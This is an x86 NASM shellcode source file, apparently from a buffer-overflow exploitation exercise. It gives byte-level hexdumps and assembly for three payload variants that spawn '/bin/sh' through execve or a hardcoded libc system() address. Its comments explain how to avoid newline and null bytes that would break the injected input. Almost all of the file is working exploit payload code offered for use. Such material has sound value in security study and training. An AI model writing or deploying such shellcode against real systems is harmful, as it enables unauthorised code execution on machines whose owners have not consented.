;nasm -f elf32 -o payload_asm.o payload_asm.asm; objdump -d payload_asm.o
;final hexdump execve: (char[16]){0xbb, 0x0a, 0xf7, 0xff, 0xbf, 0x88, 0x43, 0x07, 0xb0, 0x0b, 0x31, 0xc9, 0x31, 0xd2, 0xcd, 0x80}
;final hexdump system: (char[21]){0xbb, 0x0b, 0xf7, 0xff, 0xbf, 0x53, 0x88, 0x43, 0x07, 0xb8, 0x60, 0xb0, 0xe6, 0xb7, 0xff, 0xd0, 0x31, 0xc0, 0x40, 0xcd, 0x80}
;final hexdump system v2: (char[19]){0x68, 0x42, 0x42, 0x42, 0x42, 0xb8, 0x60, 0xb0, 0xe6, 0xb7, 0xff, 0xd0, 0x31, 0xc0, 0x40, 0x31, 0xdb, 0xcd, 0x80}

section .text
	global _start

_start:
	;execve
	;mov ebx, 0xbffff70b; position of /bin/sh, see gdb, was moved by 1 char because writing 0x0a (\n) would have truncated the input
	;no need to clear eax, main already did it for us
	;mov [ebx + 7], al; should write a single nul at the 8th character of ebx aka "/bin/sh" (check with gdb to make sure)
	;mov al, 11; set eax to 11, but only the low byte (this way this instruction does not use axtra zeroes), execve has the syscall number 11 on 32bit machines, and 59 on 64bit machines
	;xor ecx, ecx; clear ecx (argv)
	;xor edx, edx; clear edx (env)
	;int 0x80; use the syscall

	;system
	;mov ebx, 0xbffff70b; it's more compact in bytes to use the registry ebx twice (we shave 1 byte)
	;push ebx
	;mov [ebx+7], al
	;mov eax, 0xb7e6b060; location of 'system' function
	;call eax; absolute call using eax instead of a relative call!

	;somewhat compact exit (the exit value will not be set, so most probably wont be 0)
	;xor eax, eax
	;inc eax
	;int 0x80

	;system v2
	push 0x42424242; our /bin/sh will be right after this asm
	mov eax, 0xb7e6b060; location of 'system' function
	call eax; absolute call using eax instead of a relative call!

	xor eax, eax
	inc eax
	xor ebx, ebx; we can use a clean exit(0) this time since we aren't limited anymore
	int 0x80